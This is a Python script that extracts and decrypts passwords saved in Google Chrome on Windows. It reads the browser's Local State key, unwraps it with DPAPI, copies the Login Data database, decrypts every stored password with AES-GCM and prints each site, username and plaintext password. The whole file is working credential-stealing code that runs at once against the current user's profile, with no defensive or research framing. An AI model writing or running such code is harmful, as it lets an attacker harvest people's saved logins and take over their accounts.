import sqlite3
from Cryptodome.Cipher import AES
import os
import json
import shutil
import base64
import win32crypt

class Gobbler():
    def __init__(self, encryptionKeyPathChrome, loginDataPathChrome, *args, **kwargs):
        self._encryptionKeyPathChrome = encryptionKeyPathChrome
        self._loginDataPathChrome = loginDataPathChrome
        self._chromeEncryptionKey = ""
        self._dbFileChrome = "chrome.db"
        self._websites = []
        self._encryptedPasswords = []
        self._usernames = [] 
        self._plaintextPasswords = []

    # Read the encryption key from the filesystem path
    def readEncryptionKey(self, *args, **kwargs):
                                                    
        with open(self._encryptionKeyPathChrome, "r", encoding="utf-8") as f:
            localStateData = f.read()
            localStateData = json.loads(localStateData)

        # Decode the encryption key using base64
        encryptionKey = base64.b64decode(
        localStateData["os_crypt"]["encrypted_key"])
        
        # Remove Windows Data Protection API (DPAPI)
        encryptionKey = encryptionKey[5:]
        
        # Return decrypted key
        self._chromeEncryptionKey = win32crypt.CryptUnprotectData(
        encryptionKey, None, None, None, 0)[1]

    # Get a list of all encrypted passwords and other associated information
    def getCipherTextPasswords(self, *args, **kwargs):
        
        # Create a clone of the "Login Data" database file containing encrypted passwords
        shutil.copy2(self._loginDataPathChrome, self._dbFileChrome)
        
        # Read contents of the table "logins" from the cloned "chrome.db" file
        conn = sqlite3.connect(self._dbFileChrome)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        # Save data extracted from the "Login Data" (SQLite3 database) file
        for index,login in enumerate(cursor.fetchall()):            
            self._websites.append(login[0])
            self._usernames.append(login[1])
            self._encryptedPasswords.append(login[2])           

    # Decrypt each password stored in the encryptedPasswords array
    def aesPasswordDecrypt(self, *args, **kwargs):
        try:
            # Seperate the initialization vector and remaining ciphertext
            for ciphertext in self._encryptedPasswords:
                iv = ciphertext[3:15]
                password = ciphertext[15:len(ciphertext)]

                # Instantiate a new AES cipher based on the encryption key and the initialization key from the encrypted password
                cipher = AES.new(self._chromeEncryptionKey, AES.MODE_GCM, iv)

                # Decrypt the ciphertext and save the plaintext password 
                self._plaintextPasswords.append(cipher.decrypt(password)[:-16].decode())
        except:
            pass

    # Display extracted email addresses and passwords as well as associated websites
    def dumpCollection(self, *args, **kwargs):
        for i in range(0,len(self._plaintextPasswords)):
            print("Website: {} | Username: {} | Password: {}".format(self._websites[i], self._usernames[i], self._plaintextPasswords[i]))

# User environment variables (username and system path)
currentUser = os.getlogin()
systemRootPath = os.path.abspath(os.sep)

# Default files for chrome passwords and encryption key data
chromeEncryptionKeyPath = "{}Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State".format(systemRootPath, currentUser)
chromeLoginDataPath = "{}Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data".format(systemRootPath, currentUser)

# Instantiate a new Gobbler object
Gobble = Gobbler(chromeEncryptionKeyPath, chromeLoginDataPath)
Gobble.readEncryptionKey()
Gobble.getCipherTextPasswords()
Gobble.aesPasswordDecrypt()
Gobble.dumpCollection()